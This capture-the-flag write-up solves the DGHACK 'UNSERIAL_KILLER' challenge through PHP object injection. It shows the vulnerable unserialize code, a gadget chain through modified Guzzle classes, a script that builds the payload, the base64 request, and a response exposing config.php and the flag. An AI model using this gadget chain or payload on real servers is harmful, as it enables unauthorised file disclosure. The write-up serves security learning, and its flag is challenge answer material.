# UNSERIAL_KILLER
```
Une entreprise vient de se faire attaquer par des hackers ayant récupéré la configuration d'un de leur serveur web.

Auditez le code source du serveur web et trouvez comment ils ont pu y accéder.
```

On the website we can get the source code :

- Fichier : [app.zip](../attachements/unserial_killer/app.zip)

It seems that we need to perform a php object injection to retrieve the flag in `config.php`

```php
 32 function main()
 33 {
 34     $message = "";
 35     if (isset($_REQUEST["data"])) {
 36         try {
 37             $decoded = base64_decode($_REQUEST["data"]);
 38             $data = unserialize($decoded);
 39         } catch (\Throwable $t) {
 40             var_dump($t);
 41         }   
 42     } else {
 43         $message = "<p>Des hackers ont pu accéder à la configuration de tout notre système via notre serveur web.</p>" . PHP_EOL .
 44             "<p>Decouvrez comment ils ont pu y accéder en auditant les sources du site.</p>" . PHP_EOL .
 45             "<p>Vous pouvez télécharger les sources en <a href='?download=1'>cliquant ici !</a></p>" . PHP_EOL .
 46             "<p>N.B: la configuration du système se trouve dans le fichier config.php.<p>" . PHP_EOL;
 47     }       
 48     return $message;
 49 }    
```

With a request that looks like :

```
https://unserialkiller2.chall.malicecyber.com/?data=<payload>
```

We'll use the `GuzzleHttp\Psr7\FnStream -> getContents` function to read `config.php`

```php
    public function getContents()
    {   
        $content = ""; 
        if (isset($this->_fn_getContents) && is_string($this->_fn_getContents)) {
            $file = __DIR__ . $this->_fn_getContents . ".php";
            if ($this->display_content === true) {
                readfile($file);
                echo "Printing interesting file..." . PHP_EOL;
            }   
        }
        return $content;
    }   
```

For that we need `_fn_getContents` to be equal to `"/../../../../config"`

The problem is that the `__wake` function unset the variable :

```php
    /**
     * An unserialize would allow the __destruct to run when the unserialized value goes out of scope.
     *
     * @throws \LogicException
     */
    public function __wakeup()
    {
        unset($this->_fn_getMetadata);
        unset($this->_fn_close);
        unset($this->_fn_detach);
        unset($this->_fn_eof);
        unset($this->_fn_isSeekable);
        unset($this->_fn_rewind);
        unset($this->_fn___toString);
        unset($this->_fn_seek);
        unset($this->_fn_isWritable);
        unset($this->_fn_write);
        unset($this->_fn_getContents);
        unset($this->_fn_getSize);
        unset($this->_fn_tell);
        unset($this->_fn_isReadable);
        unset($this->_fn_read);
        echo "Disabling easy peasy attributes" . PHP_EOL;
    }
```

But we can use `allow_attribute` to allow the `_fn_getContent` to be set and the `register` to set the variable :

```php
    /**
     * Authorize an attribute to be set as method callback
     */
    public function allow_attribute(string $name)
    {
        echo "FnStream->allow_attribute : " . $name . " <br/>";
        if (in_array($name, self::$forbidden_attributes, true) === true) {
            $offset = array_search($name, self::$forbidden_attributes, true);
            unset(self::$forbidden_attributes[$offset]);
        }
    }

    /**
     * Register attribute as method
     */
    public function register(string $name, $callback)
    {
        echo "FnStream->register : " . $name . " = " . $callback . " <br/>";
        if (in_array($name, self::$forbidden_attributes) === true) {
            throw new \LogicException('FnStream should never register this attribute: ' . $name);
        }
        $this->{$name} = $callback;
        $this->methods[] = [$name, $callback];
    }
```

A way to call these functions is to use the `__call` method from `StreamDecoratorTrait` :

```php
    /**
     * Allow decorators to implement custom methods
     *
     * @param string $method Missing method name
     * @param array  $args   Method arguments
     *
     * @return mixed
     */
    public function __call($method, array $args)
    {
        $result = null;
        if (is_object($this->stream) && method_exists($this->stream, "decorate")) {
            if (in_array($method, $this->getAllowedMethods()) !== true) {
                $method = $this->custom_method;
            }
            if (is_array($method) !== true) {
                $method = [$method];
            }

            $args = $args[0];

            foreach ($method as $_method) {
                if (is_callable([$this->stream, $_method])) {
                    $arguments = array_shift($args);
                    var_dump($arguments);
                    $result = $this->stream->$_method(...$arguments);
                }
            }
        }
        // Always return the wrapped object if the result is a return $this
        return $result === $this->stream ? $this : $result;
    }
```

If we set `$this->stream` to a `FnStream` object we could call all of the needed functions one after the other.

And finally to call this `__call` function we'll use the `__destroy` method from `GuzzleHttp\Psr7\Stream`.

```php
    /** 
     * Closes the stream when the destructed
     */
    public function __destruct()
    {   
        $this->customMetadata->closeContent($this->size);
    }   
```

The setup :

1) Stream object1 with :
- `$this->customMetadata` equal to an object2 (`CachingStream`) that inherits from the trait `StreamDecoratorTrait` that does not possess the `closeContent` method.
- `$this->size` equal to the needed args for all of our calls :

```php
array(array("_fn_getContents"),array("_fn_getContents","/../../../../config"),array())
```

2) object2 with :
- `$this->stream` equal to an object3 `FnStream`
- `$this->custom_method` equal to an array of all of our calls :

```php
array('allow_attribute','register','getContents')
```

3) object3 with :
- `$this->display_content` set to true

Here we serialize the object, `payload.php`:

```php
<?php

namespace GuzzleHttp\Psr7
{
    trait StreamDecoratorTrait
    {   
    }   

    class CachingStream
    {   
        public function __construct()
        {   
            $this->stream = new FnStream(); 
            $this->custom_method = array('allow_attribute','register','getContents');
        }   
            
    }   

    class FnStream
    {   
        public function __construct()
        {   
            $this->display_content = true;
        }   
    }   

    class Stream
    {   
        public function __construct()
        {   
            $this->customMetadata = new CachingStream();
            $this->size = array(array("_fn_getContents"),array("_fn_getContents","/../../../../config"),array());
        }   
    }   
}

namespace main {
    $obj = new \GuzzleHttp\Psr7\Stream();
    echo serialize($obj);
}
```

```
$ php paylaod.php
O:22:"GuzzleHttp\Psr7\Stream":2:{s:14:"customMetadata";O:29:"GuzzleHttp\Psr7\CachingStream":2:{s:6:"stream";O:24:"GuzzleHttp\Psr7\FnStream":1:{s:15:"display_content";b:1;}s:13:"custom_method";a:3:{i:0;s:15:"allow_attribute";i:1;s:8:"register";i:2;s:11:"getContents";}}s:4:"size";a:3:{i:0;a:1:{i:0;s:15:"_fn_getContents";}i:1;a:2:{i:0;s:15:"_fn_getContents";i:1;s:19:"/../../../../config";}i:2;a:0:{}}}
```

We then encode in base64 and send the payload :

```
GET /?data=TzoyMjoiR3V6emxlSHR0cFxQc3I3XFN0cmVhbSI6Mjp7czoxNDoiY3VzdG9tTWV0YWRhdGEiO086Mjk6Ikd1enpsZUh0dHBcUHNyN1xDYWNoaW5nU3RyZWFtIjoyOntzOjY6InN0cmVhbSI7TzoyNDoiR3V6emxlSHR0cFxQc3I3XEZuU3RyZWFtIjoxOntzOjE1OiJkaXNwbGF5X2NvbnRlbnQiO2I6MTt9czoxMzoiY3VzdG9tX21ldGhvZCI7YTozOntpOjA7czoxNToiYWxsb3dfYXR0cmlidXRlIjtpOjE7czo4OiJyZWdpc3RlciI7aToyO3M6MTE6ImdldENvbnRlbnRzIjt9fXM6NDoic2l6ZSI7YTozOntpOjA7YToxOntpOjA7czoxNToiX2ZuX2dldENvbnRlbnRzIjt9aToxO2E6Mjp7aTowO3M6MTU6Il9mbl9nZXRDb250ZW50cyI7aToxO3M6MTk6Ii8uLi8uLi8uLi8uLi9jb25maWciO31pOjI7YTowOnt9fX0%3d HTTP/1.1
Host: unserialkiller2.chall.malicecyber.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.119 Safari/537.36
Connection: close
Cache-Control: max-age=0
```

We obtain this response :

```
HTTP/1.1 200 OK
Content-Length: 139
Content-Type: text/html; charset=UTF-8
Date: Fri, 18 Nov 2022 12:14:39 GMT
Server: Apache/2.4.53 (Debian)
Vary: Accept-Encoding
X-Powered-By: PHP/8.1.6
Connection: close

Disabling easy peasy attributes
<?php

$FLAG = "DGHACK{D_Ont_M3sS_W1th_PhP_0bj3Ct5}";
Printing interesting file...
Removing FnStream Object
```

flag : `DGHACK{D_Ont_M3sS_W1th_PhP_0bj3Ct5}`
